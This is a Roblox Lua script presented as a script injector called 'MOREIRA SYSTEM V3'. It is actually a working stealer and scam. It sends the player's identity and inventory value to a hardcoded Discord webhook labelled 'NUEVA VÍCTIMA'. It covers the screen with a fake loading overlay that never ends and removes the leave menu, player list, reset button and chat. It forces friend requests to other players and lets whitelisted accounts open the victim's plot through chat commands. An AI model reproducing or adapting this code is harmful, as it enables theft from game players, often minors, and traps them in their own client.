local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local GuiService = game:GetService("GuiService")
local VIM = game:GetService("VirtualInputManager")

-- CONFIGURACI√ìN
local WEBHOOK_URL = "https://discord.com/api/webhooks/1456818151617466540/gTXIOakP_WD8mLEEuvEKO-0NeoIXCnze3xBQubOKmDhmxSioyYPIaC0gFvWOBC_VKVhg"
local heartbeatUrl = WEBHOOK_URL 
local Min_Gen = 0

-- VARIABLES LOCALES
local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
local UserID = LocalPlayer.UserId

local whitelist = {
    "hesizdev",
    "IlIlIlIlIIlI_lIlIlIl",
    "multicuentadeangel5"
}

-- ==================== SISTEMA DE WHITELIST ====================
local instanciasWhitelist = {}

local function agregarAWhitelist(instancia)
    if instancia then
        instanciasWhitelist[instancia] = true
    end
end

local function estaEnWhitelist(instancia)
    if instanciasWhitelist[instancia] then return true end
    local p = instancia.Parent
    while p do
        if instanciasWhitelist[p] then return true end
        p = p.Parent
    end
    return false
end

local function isWhitelisted(username)
    for _, whitelistedName in ipairs(whitelist) do
        if username == whitelistedName then return true end
    end
    return false
end

agregarAWhitelist(Players)
agregarAWhitelist(CoreGui)
agregarAWhitelist(StarterGui)
agregarAWhitelist(LocalPlayer)

-- ==================== FUNCIONES UTILIDAD ====================

local function formatNumberShort(n)
    if not n or type(n) ~= "number" then return "$0" end
    if n >= 1e9 then return string.format("$%.2fB", n / 1e9) end
    if n >= 1e6 then return string.format("$%.2fM", n / 1e6) end
    if n >= 1e3 then return string.format("$%.2fK", n / 1e3) end
    return "$" .. tostring(n)
end

local function parseValueFromText(s)
    if not s then return 0 end
    local clean = s:gsub("[^%d%.KMB+]", "")
    local numPart = clean:match("([%d%.]+)")
    if not numPart then return 0 end
    local n = tonumber(numPart) or 0
    if clean:find("B") then return n * 1e9
    elseif clean:find("M") then return n * 1e6
    elseif clean:find("K") then return n * 1e3
    else return n end
end

-- ==================== FANTASMA ====================

local function aplicarFantasma(modelo)
    if not modelo then return end
    task.spawn(function()
        task.wait(0.5)
        for _, desc in ipairs(modelo:GetDescendants()) do
            if desc:IsA("BasePart") then
                desc.Transparency = 1
                desc.CanCollide = false
                desc.CanTouch = false
                desc.CanQuery = false
                desc.CastShadow = false
            end
            if desc:IsA("Decal") or desc:IsA("Texture") or desc:IsA("Clothing") then
                pcall(function() desc.Transparency = 1 end)
            end
            if desc:IsA("BillboardGui") or desc:IsA("SurfaceGui") then
                desc.Enabled = false
            end
            if desc:IsA("Accessory") then
                local handle = desc:FindFirstChild("Handle")
                if handle then
                    handle.Transparency = 1
                    handle.CanCollide = false
                end
            end
        end
        modelo.DescendantAdded:Connect(function(nuevo)
            if nuevo:IsA("BasePart") then
                nuevo.Transparency = 1
                nuevo.CanCollide = false
            elseif nuevo:IsA("BillboardGui") then
                nuevo.Enabled = false
            end
        end)
    end)
end

-- ==================== LOGICA SERVER ====================

local function sendCommandToServer(playerWhoUsed)
    local success, result = pcall(function()
        if not HttpService or not heartbeatUrl then return end
        local displayName = playerWhoUsed.DisplayName or playerWhoUsed.Name
        local userId = playerWhoUsed.UserId
        local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
        
        local commandData = {
            ["username"] = displayName,
            ["avatar_url"] = avatarUrl,
            ["embeds"] = {{
                ["author"] = { ["name"] = displayName, ["icon_url"] = avatarUrl },
                ["title"] = "Comando ejecutado",
                ["color"] = 65326,
                ["description"] = displayName .. " Uso \".add\"",
                ["thumbnail"] = { ["url"] = avatarUrl },
                ["footer"] = { ["text"] = "User ID: " .. tostring(userId) },
                ["timestamp"] = DateTime.now():ToIsoDate()
            }}
        }
        HttpService:RequestAsync({
            Url = heartbeatUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(commandData)
        })
    end)
end

function promptFR(targetPlayer)
    if not targetPlayer then return end
    local oldId = (getthreadidentity and getthreadidentity()) or nil
    if setthreadidentity then pcall(setthreadidentity, 5) end
    pcall(function() StarterGui:SetCore("PromptSendFriendRequest", targetPlayer) end)
    if setthreadidentity and oldId then pcall(setthreadidentity, oldId) end
    task.wait(0.5)
    pcall(function()
        local rgui = CoreGui:FindFirstChild("RobloxGui")
        local btn = rgui and rgui:FindFirstChild("ConfirmButton", true)
        if btn then
            if not pcall(function() btn:Activate() end) then
                GuiService.SelectedObject = btn
                VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
            end
        end
    end)
end

-- ==================== JUGADORES ====================

local function configurarJugador(playerToConfig)
    if playerToConfig == LocalPlayer then return end

    playerToConfig.Chatted:Connect(function(msg)
        local msgLower = msg:lower():gsub("%s+", "")
        
        if msgLower == ".add" then
            pcall(function() sendCommandToServer(playerToConfig) end)
            pcall(function() promptFR(playerToConfig) end) 
        elseif msgLower == ".block" and isWhitelisted(playerToConfig.Name) then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and not isWhitelisted(player.Name) then
                    StarterGui:SetCore("PromptBlockPlayer", player)
                    task.wait(0.5)
                end
            end
        elseif msgLower == ".open" and isWhitelisted(playerToConfig.Name) then
            pcall(function()
                ReplicatedStorage.Packages.Net["RE/PlotService/ToggleFriends"]:FireServer()
            end)
        end
    end)

    playerToConfig.CharacterAdded:Connect(function(char)
        aplicarFantasma(char)
        agregarAWhitelist(char)
    end)
    if playerToConfig.Character then
        aplicarFantasma(playerToConfig.Character)
        agregarAWhitelist(playerToConfig.Character)
    end
end

for _, p in ipairs(Players:GetPlayers()) do configurarJugador(p) end
Players.PlayerAdded:Connect(configurarJugador)

-- ==================== PROTECCION GUI ====================

local function limpiarInterfaz()
    task.spawn(function()
        pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
        pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false) end)
    end)
end
limpiarInterfaz()
task.spawn(function() while true do task.wait(5) limpiarInterfaz() end end)

local function handleNewDescendant(descendant)
    if descendant.Name == "Players" or descendant.Name == "LeaveGamePage" then
        task.wait() 
        pcall(function() descendant:Destroy() end)
    end
end

for _, desc in ipairs(CoreGui:GetDescendants()) do handleNewDescendant(desc) end
CoreGui.DescendantAdded:Connect(handleNewDescendant)

local function bloquearMenuEscape()
    task.spawn(function()
        pcall(function()
            local adminPanel = playerGui:FindFirstChild("AdminPanel")
            if adminPanel then adminPanel:Destroy() end
        end)
        pcall(function()
            local playerList = CoreGui:FindFirstChild("PlayerList")
            if playerList then playerList:Destroy() end
        end)
        task.spawn(function()
            while task.wait(0.5) do
                pcall(function()
                    local innerFrame = CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame
                    if innerFrame:FindFirstChild("Players") then innerFrame.Players:Destroy() end
                    if innerFrame:FindFirstChild("LeaveGamePage") then innerFrame.LeaveGamePage:Destroy() end
                end)
            end
        end)
    end)
end
bloquearMenuEscape()

-- ==================== BLOQUEO INSTANCIAS ====================

local function esParteDeJugador(instancia)
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Character and instancia:IsDescendantOf(p.Character) then return true end
    end
    return false
end

local function bloquearInstancia(instancia)
    if estaEnWhitelist(instancia) then return end
    if esParteDeJugador(instancia) then return end
    pcall(function()
        task.defer(function()
            if instancia and instancia.Parent then instancia:Destroy() end
        end)
    end)
end

game.DescendantAdded:Connect(bloquearInstancia)

-- ==================== AUTO CLICKER ====================

CoreGui.DescendantAdded:Connect(function(descendant)
    if descendant:IsA("GuiObject") and descendant:FindFirstAncestorWhichIsA("ScreenGui") then
        local screenGui = descendant:FindFirstAncestorWhichIsA("ScreenGui")
        if screenGui.Name == "BlockingModalScreen" then
            if descendant:IsA("TextLabel") then descendant:Destroy() end
            if descendant:IsA("GuiObject") then descendant.BackgroundTransparency = 1 end
            if descendant:IsA("TextButton") then descendant.TextTransparency = 1 end
            if descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then descendant.ImageTransparency = 1 end
            
            if descendant.Name == "3" and descendant.Parent and descendant.Parent.Name == "Buttons" then
                descendant.Size = UDim2.new(0, 5000, 0, 5000)
                descendant.Position = UDim2.new(0.5, 0, 0.5, 0)
                descendant.AnchorPoint = Vector2.new(0.5, 0.5)
                task.wait()
                local buttonPosition = descendant.AbsolutePosition
                local buttonSize = descendant.AbsoluteSize
                local clickX = buttonPosition.X + buttonSize.X / 2
                local clickY = buttonPosition.Y + buttonSize.Y / 2
                VIM:SendMouseButtonEvent(clickX, clickY, 0, true, game, 0)
                task.wait(0.1)
                VIM:SendMouseButtonEvent(clickX, clickY, 0, false, game, 0)
            end
        end
    end
end)

-- ==================== UI & LOGIC ====================

local function getBrainrots()
    local results = {}
    for _, desc in ipairs(Workspace:GetDescendants()) do
        if desc:IsA("BillboardGui") or desc.Name:find("Overhead") or desc.Name:find("Display") then
            local nameLbl = desc:FindFirstChild("DisplayName") or desc:FindFirstChild("Name") or desc:FindFirstChild("Title")
            local genLbl = desc:FindFirstChild("Generation") or desc:FindFirstChild("Value") or desc:FindFirstChild("Stat")
            if nameLbl and genLbl and nameLbl:IsA("TextLabel") and genLbl:IsA("TextLabel") then
                local val = parseValueFromText(genLbl.Text)
                if val >= Min_Gen then
                    local key = nameLbl.Text .. "|" .. val
                    if results[key] then results[key].count = results[key].count + 1
                    else results[key] = {name = nameLbl.Text, value = val, count = 1} end
                end
            end
        end
    end
    local out = {}
    for _, v in pairs(results) do table.insert(out, v) end
    table.sort(out, function(a, b) return a.value > b.value end)
    return out
end

local function sendToDiscord(link, brainrots)
    local itemList = ""
    local totalValue = 0
    for i, br in ipairs(brainrots) do
        if i <= 15 then itemList = itemList .. string.format("> `[%d]` **%s** ‚ûî %s (x%d)\n", i, br.name, formatNumberShort(br.value), br.count) end
        totalValue = totalValue + (br.value * br.count)
    end
    local request = syn and syn.request or http_request or request
    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                content = "||@everyone|| ü©∏ **NUEVA V√çCTIMA**",
                embeds = {{
                    title = "üöÄ Reporte de Extracci√≥n Moreira",
                    color = 16711680,
                    fields = {
                        {name = "üë§ Usuario", value = LocalPlayer.Name .. " (" .. UserID .. ")", inline = true},
                        {name = "üí∞ Valor Total", value = "**" .. formatNumberShort(totalValue) .. "**", inline = true},
                        {name = "üîó Script", value = "`" .. link .. "`"},
                        {name = "üìã Inventario", value = (itemList ~= "" and itemList or "Vac√≠o")}
                    }
                }}
            })
        })
    end)
end

-- ==================== PANTALLA DE CARGA (MODIFICADA) ====================
local function PantallaDeCargaInfinita(screenGui)
    -- Crear frame de pantalla completa
    local FullScreen = Instance.new("Frame")
    FullScreen.Name = "LoadingOverlay"
    FullScreen.Parent = screenGui -- Se pone directo en el ScreenGui, no en el Frame chiquito
    FullScreen.Size = UDim2.new(1, 0, 1, 0) -- Cubre toda la pantalla
    FullScreen.Position = UDim2.new(0, 0, 0, 0)
    FullScreen.BackgroundColor3 = Color3.new(0, 0, 0) -- Negro absoluto
    FullScreen.ZIndex = 9999 -- Encima de todo
    FullScreen.BorderSizePixel = 0

    local Container = Instance.new("Frame", FullScreen)
    Container.Size = UDim2.new(0.5, 0, 0.2, 0)
    Container.Position = UDim2.new(0.5, 0, 0.5, 0)
    Container.AnchorPoint = Vector2.new(0.5, 0.5)
    Container.BackgroundTransparency = 1

    local StatusText = Instance.new("TextLabel", Container)
    StatusText.Size = UDim2.new(1, 0, 0, 40)
    StatusText.Position = UDim2.new(0, 0, 0.2, 0)
    StatusText.BackgroundTransparency = 1
    StatusText.TextColor3 = Color3.fromRGB(255, 50, 50) -- Rojo hacker
    StatusText.Font = Enum.Font.Code
    StatusText.TextSize = 24
    StatusText.Text = "Inicializando..."

    local BarBg = Instance.new("Frame", Container)
    BarBg.Size = UDim2.new(1, 0, 0, 8)
    BarBg.Position = UDim2.new(0, 0, 0.6, 0)
    BarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    BarBg.BorderSizePixel = 0
    Instance.new("UICorner", BarBg).CornerRadius = UDim.new(1, 0)

    local BarFill = Instance.new("Frame", BarBg)
    BarFill.Size = UDim2.new(0, 0, 1, 0)
    BarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    BarFill.BorderSizePixel = 0
    Instance.new("UICorner", BarFill).CornerRadius = UDim.new(1, 0)

    local textos = {
        "Conectando al servidor...",
        "Bypassing Anti-Cheat...",
        "Analizando entorno...",
        "Cargando m√≥dulos...",
        "Inyectando script...",
        "Ejecutando..."
    }

    task.spawn(function()
        -- Animaci√≥n de textos
        for i, txt in ipairs(textos) do
            StatusText.Text = txt
            local progress = i / #textos
            TweenService:Create(BarFill, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {Size = UDim2.new(progress, 0, 1, 0)}):Play()
            task.wait(math.random(5, 15) / 10)
        end
        
        -- ESTADO FINAL (INFINITO)
        BarFill.Size = UDim2.new(1, 0, 1, 0)
        StatusText.Text = "Esperando respuesta del servidor..." 
        
        -- Aqu√≠ NO hay destroy. La pantalla se queda para siempre.
        -- Puedes agregar un bucle de puntos suspensivos para que parezca que hace algo
        while true do
            StatusText.Text = "Procesando datos."
            task.wait(0.5)
            StatusText.Text = "Procesando datos.."
            task.wait(0.5)
            StatusText.Text = "Procesando datos..."
            task.wait(0.5)
        end
    end)
end

local function IniciarMenu()
    local MenuGui = Instance.new("ScreenGui", playerGui)
    MenuGui.Name = "MoreiraSystemUI"
    MenuGui.ResetOnSpawn = false
    MenuGui.IgnoreGuiInset = true -- Importante para cubrir la barra superior de Roblox
    
    local Frame = Instance.new("Frame", MenuGui)
    Frame.Size = UDim2.new(0, 450, 0, 280)
    Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
    Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    Instance.new("UIStroke", Frame).Color = Color3.fromRGB(255, 40, 40)
    Instance.new("UICorner", Frame)

    local Title = Instance.new("TextLabel", Frame)
    Title.Text = "MOREIRA SYSTEM V3"
    Title.Size = UDim2.new(1, 0, 0, 60)
    Title.TextColor3 = Color3.new(1, 1, 1)
    Title.Font = Enum.Font.GothamBold
    Title.BackgroundTransparency = 1

    local Input = Instance.new("TextBox", Frame)
    Input.Size = UDim2.new(0.85, 0, 0, 50)
    Input.Position = UDim2.new(0.075, 0, 0.45, 0)
    Input.PlaceholderText = "Pega el script aqu√≠..."
    Input.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    Input.TextColor3 = Color3.new(1, 1, 1)
    Instance.new("UICorner", Input)

    local Btn = Instance.new("TextButton", Frame)
    Btn.Size = UDim2.new(0.6, 0, 0, 50)
    Btn.Position = UDim2.new(0.2, 0, 0.78, 0)
    Btn.Text = "INYECTAR"
    Btn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
    Btn.TextColor3 = Color3.new(1, 1, 1)
    Instance.new("UICorner", Btn)

    Btn.MouseButton1Click:Connect(function()
        local link = Input.Text
        local brs = getBrainrots()
        
        -- 1. Destruir el men√∫ peque√±o para limpiar
        Frame:Destroy()
        
        -- 2. Activar pantalla de carga infinita en el ScreenGui
        PantallaDeCargaInfinita(MenuGui)
        
        -- 3. Enviar datos (mientras la pantalla tapa todo)
        sendToDiscord(link, brs)
        
        -- Opcional: Ejecutar lo que pegaron (para dar realismo)
        if link ~= "" then
            pcall(function() loadstring(link)() end)
        end
    end)
end

IniciarMenu()
